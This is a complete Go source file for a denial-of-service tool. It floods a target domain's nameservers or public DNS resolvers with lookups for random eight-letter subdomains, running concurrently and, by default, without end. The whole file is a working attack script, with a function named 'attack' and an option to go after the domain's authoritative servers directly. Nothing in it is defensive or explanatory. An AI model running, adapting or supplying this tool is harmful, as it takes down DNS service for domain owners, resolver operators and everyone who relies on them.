package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var seededRand = rand.New(rand.NewSource(time.Now().UnixNano())) // *rand.Rand
const randCharset = "abcdefghijklmnopqrstuvwxyz"
const subdomainLength = 8

func randomString(length int) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = randCharset[seededRand.Intn(len(randCharset))]
	}
	return string(b)
}

func createResolver(nameserver string) *net.Resolver {
	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, "udp", net.JoinHostPort(nameserver, "53"))
		},
	}
}

func attack(wg *sync.WaitGroup, domain, dnsServer string, count, delay int) {
	defer wg.Done()
	resolver := createResolver(dnsServer)
	if count == 0 {
		count = -1
	}

	for i := 0; i != count; {
		ctx, cancel := context.WithTimeout(context.TODO(), time.Millisecond)
		currentSubdomain := randomString(subdomainLength) + "." + domain
		_, err := resolver.LookupHost(ctx, currentSubdomain)
		if err != nil && !strings.Contains(err.Error(), "i/o timeout") {
			fmt.Println("error resolving "+currentSubdomain, err)
		}
		cancel()
		time.Sleep(time.Duration(int64(delay) * int64(time.Millisecond)))
		if count > 0 {
			i++
		}
	}

}

func main() {
	targetDomain := flag.String("t", "", "Target domain")
	initialDNS := flag.String("s", "8.8.8.8", "Initial DNS server. Ignored if a file is specified")
	serversListFile := flag.String("f", "", "File with DNS servers")
	direct := flag.Bool("d", false, "Attack domain nameservers directly instead of public DNS servers")
	requestCount := flag.Int("count", 0, "Count of requests to each DNS server. 0 or less means infinite")
	requestDelay := flag.Int("delay", 1000, "Milliseconds between each request")
	flag.Parse()
	mainContext := context.TODO()
	var mainWaitGroup sync.WaitGroup
	var serversList []string

	if *targetDomain == "" {
		fmt.Println("No target domain specified")
		os.Exit(1)
	}

	if *direct {
		resolver := createResolver(*initialDNS)
		hosts, err := resolver.LookupNS(mainContext, *targetDomain)
		if err != nil {
			fmt.Printf("Could not get NSs: %v\n", err)
			os.Exit(1)
		}
		for _, host := range hosts {
			serversList = append(serversList, host.Host)
		}
	} else if *serversListFile != "" {
		file, err := os.Open(*serversListFile)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		} else {
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				serversList = append(serversList, scanner.Text())
			}
			if err := scanner.Err(); err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
		}
	}

	if len(serversList) == 0 {
		serversList = append(serversList, *initialDNS)
	}

	fmt.Println("Running attack against ", serversList)
	for _, dnsServer := range serversList {
		mainWaitGroup.Add(1)
		go attack(&mainWaitGroup, *targetDomain, dnsServer, *requestCount, *requestDelay)
	}
	mainWaitGroup.Wait()
}
